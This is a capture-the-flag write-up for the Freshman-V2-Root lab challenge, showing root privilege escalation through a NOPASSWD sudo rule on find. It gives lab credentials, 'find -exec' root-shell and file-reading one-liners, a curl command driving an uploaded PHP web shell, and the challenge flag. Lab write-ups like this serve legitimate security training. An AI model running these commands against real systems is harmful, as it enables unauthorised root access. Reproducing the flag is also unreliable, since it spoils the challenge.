# 👑 Freshman-V2-Root (Boot-to-Root)

---

## Flag
```
hack10{r00t_priv3sc_v1a_s0ud0_find_w00t}
```

---

## Challenge Overview

This challenge is a continuation of **Freshman-V2 — User**.

### Objective:
- Escalate privileges from user (`freshman`)  
- Obtain root access  
- Retrieve the root flag  

---

## Initial Context

From the previous stage:
- We have access as user: `freshman`  
- Credentials:
  ```
  username: freshman  
  password: freshman123
  ```

Access is obtained via a non-interactive shell.

---

## Step 1: Check Sudo Permissions

Enumerate sudo privileges:

```bash
echo freshman123 | su freshman -c 'sudo -l'
```

### Output:

```
User freshman may run the following commands on Hack10-Freshman-V2:
(ALL) NOPASSWD: /usr/bin/find
```

---

## Vulnerability — Misconfigured Sudo

Key issue:
- User `freshman` can run `/usr/bin/find` as **root**
- No password required (`NOPASSWD`)

### Why this is dangerous:

`find` supports command execution via:

```bash
-exec
```

---

## Exploitation Strategy

Use `find` to execute commands as root.

---

## Step 2: Privilege Escalation

### Option 1: Spawn Root Shell (Interactive)

```bash
sudo find . -exec /bin/bash \; -quit
```

---

### Option 2: Read Root Flag Directly (Non-Interactive)

Since the shell is unstable, use:

```bash
echo freshman123 | su freshman -c 'sudo find / -name root.txt -exec cat {} \; -quit'
```

---

### Web Shell Version (URL Encoded)

```bash
curl -s "http://192.168.56.107/uploads/shell.php?cmd=echo%20freshman123%20%7C%20su%20freshman%20-c%20%27sudo%20find%20/%20-name%20root.txt%20-exec%20cat%20%7B%7D%20%5C%3B%20-quit%27"
```

---

## Step 3: Retrieve Flag

The output contains a Base64-encoded flag.

### Decode:

```bash
echo "encoded_string" | base64 -d
```

---

## Final Result

```
hack10{r00t_priv3sc_v1a_s0ud0_find_w00t}
```

---

## Key Takeaways

- Misconfigured sudo permissions can lead to full system compromise  
- `find` is dangerous when combined with `sudo`  
- GTFOBins is a valuable resource for privilege escalation techniques  
- Non-interactive shells require creative execution methods  
- Encoding (Base64) is commonly used to obscure sensitive data  

---

## Tools Used

- Linux commands (`sudo`, `find`, `cat`)  
- curl (for remote execution)  
- Base64 decoding tools / CyberChef  
- GTFOBins (reference for exploitation techniques)  

---

## Skills Developed

- Privilege escalation techniques  
- Sudo misconfiguration analysis  
- Command execution abuse  
- Post-exploitation strategies  
- Understanding Linux permissions and security flaws  

---

⭐ *This challenge demonstrates how a single misconfigured sudo permission can lead to full root compromise.*
